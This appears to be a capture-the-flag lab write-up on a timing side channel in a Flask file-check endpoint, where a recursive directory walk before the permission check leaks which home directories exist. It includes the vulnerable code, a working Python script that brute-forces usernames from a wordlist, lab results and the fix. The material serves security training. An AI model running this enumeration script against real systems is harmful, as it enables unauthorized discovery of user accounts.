# Data Exfiltration via Response Timing (60%)

## Target

Python/Flask app. `/filecheck?filepath=DIR` — recursive `os.walk` + `glob('**/*')` runs BEFORE the permission check. Valid directories with files → slow response. Invalid/nonexistent → fast return from `os.path.exists`.

## Vulnerability

```python
def get_file_details(path):
    if not os.path.exists(path): return '', 0, 0  # fast
    filecount = os.walk(path)   # SLOW — runs regardless of permission
    filesize = path.glob('**/*')  # SLOW
    owner = path.owner()
    return owner, filesize, filecount

# Route checks permission AFTER — too late, timing already leaked
owner, filesize, filecount = get_file_details(filepath)
if user == owner:
    return success  # but we already burned time
return "Access denied!"
```

## Timing Profile
- Invalid path (`/home/nonexistent/`): ~0.25s (early return)
- Valid home dir (`/home/htb-stdnt/`): ~0.88s (recursive walk)
- Valid single file (`/etc/passwd`): ~0.25s (no subdirs, same as invalid)
- **Only directories with sufficient subfiles produce a detectable timing gap**

## Exploit Script

```python
import requests

URL = "http://TARGET/filecheck"
cookies = {"session": "SESSION_COOKIE"}
WORDLIST = "/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
THRESHOLD_S = 0.55  # calibrate: invalid ~0.25s, valid ~0.88s

with open(WORDLIST) as f:
    for username in f:
        username = username.strip()
        r = requests.get(URL, params={"filepath": f"/home/{username}/"}, cookies=cookies)
        if r.elapsed.total_seconds() > THRESHOLD_S:
            print(f"[+] {username} ({r.elapsed.total_seconds():.3f}s)")
```

**Always verify candidates** with 2+ repeated requests — network jitter causes false positives.

## Result

Valid system username: `maggie`

(`general` and `penetration` were false positives — dropped to ~0.25s baseline on re-test)

## Key Notes

- Files don't leak (no recursion) — only directories with sufficient content
- Calibrate threshold between known-invalid and known-valid (htb-stdnt home dir)
- False positive rate is high on remote targets — always re-verify hits
- Other enumeration vectors: `/proc/PID/` for process IDs (less reliable, fewer files)
- Fix: permission check must come BEFORE the recursive computation
